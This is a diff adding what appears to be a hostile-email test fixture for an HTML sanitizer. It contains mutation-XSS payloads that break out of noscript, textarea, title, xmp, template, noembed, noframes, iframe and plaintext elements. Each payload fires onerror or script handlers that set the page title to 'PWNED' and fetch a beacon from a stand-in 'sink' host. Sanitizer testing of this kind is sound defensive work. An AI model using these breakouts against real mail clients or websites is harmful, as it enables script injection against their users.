@@ -1,0 +1,23 @@
+From: Hostile Sender <hostile@example.org>
+To: hostile@example.test
+Subject: Hostile 19: noscript, textarea, title, xmp, template, iframe/noembed/noframes/plaintext raw text breakouts
+Date: Mon, 2 Nov 2026 10:19:00 +0000
+Message-ID: <hostile-19@example.org>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"></head><body>
+<p>Visible text 19</p>
+<noscript><p title="</noscript><img src=http://sink/19-mxss-rawtext/noscript onerror='top.document.title='PWNED''>"></noscript>
+<textarea></textarea><img src=http://sink/19-mxss-rawtext/textarea onerror="top.document.title='PWNED'"><textarea>
+<title></title><img src=http://sink/19-mxss-rawtext/title onerror="top.document.title='PWNED'">
+<xmp><p title="</xmp><img src=http://sink/19-mxss-rawtext/xmp onerror='top.document.title='PWNED''>"></xmp>
+<template><img src=http://sink/19-mxss-rawtext/template onerror="top.document.title='PWNED'"><script>top.document.title='PWNED'</script></template>
+<template><style>p{background:url(http://sink/19-mxss-rawtext/template-style)}</style></template>
+<noembed><p title="</noembed><img src=http://sink/19-mxss-rawtext/noembed onerror='top.document.title='PWNED''>"></noembed>
+<noframes><p title="</noframes><img src=http://sink/19-mxss-rawtext/noframes onerror='top.document.title='PWNED''>"></noframes>
+<iframe><p title="</iframe><img src=http://sink/19-mxss-rawtext/iframe-raw onerror='top.document.title='PWNED''>"></iframe>
+<plaintext><img src=http://sink/19-mxss-rawtext/plaintext onerror="top.document.title='PWNED'">
+</body></html>
